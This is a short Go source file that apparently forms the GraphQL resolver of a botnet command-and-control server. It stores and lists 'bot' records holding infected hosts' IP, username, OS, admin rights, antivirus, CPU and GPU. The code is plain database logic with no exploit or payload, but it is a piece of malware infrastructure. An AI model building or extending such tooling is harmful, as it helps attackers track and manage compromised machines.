package command_control

import (
	"context"

	"github.com/gobuffalo/pop"
	"github.com/gofrs/uuid"

	"github.com/MShoaei/command_control/models"
)

func init() {
}

type Resolver struct {
	DB *pop.Connection
	// bots []models.Bot
}

func (r *Resolver) Mutation() MutationResolver {
	return &mutationResolver{r}
}
func (r *Resolver) Query() QueryResolver {
	return &queryResolver{r}
}

type mutationResolver struct{ *Resolver }

func (r *mutationResolver) CreateBot(ctx context.Context, input models.NewBot) (models.Bot, error) {
	newID, _ := uuid.NewV4()
	// r.db = models.DB
	// if err := r.DB.Open(); err != nil {
	// 	return models.Bot{}, err
	// }
	bot := models.Bot{
		ID:          newID.String(),
		IP:          input.IP,
		WhoAmI:      input.WhoAmI,
		Os:          input.Os,
		InstallDate: input.InstallDate,
		Admin:       input.Admin,
		Av:          input.Av,
		CPU:         input.CPU,
		Gpu:         input.Gpu,
		Version:     input.Version,
	}
	if err := r.DB.Create(&bot); err != nil {
		return models.Bot{}, err
	}
	return bot, nil
}

type queryResolver struct{ *Resolver }

func (r *queryResolver) Bots(ctx context.Context) ([]models.Bot, error) {
	var bots []models.Bot
	// r.db = models.DB
	// if err := r.db.Open(); err != nil {
	// 	return nil, err
	// }

	if err := r.DB.All(&bots); err != nil {
		return nil, err
	}
	return bots, nil
}
func (r *queryResolver) Bot(ctx context.Context, id string) (*models.Bot, error) {
	bot := models.Bot{}
	// r.db = models.DB
	// if err := r.db.Open(); err != nil {
	// 	return nil, err
	// }

	if err := r.DB.Find(&bot, id); err != nil {
		return nil, err
	}
	return &bot, nil
}
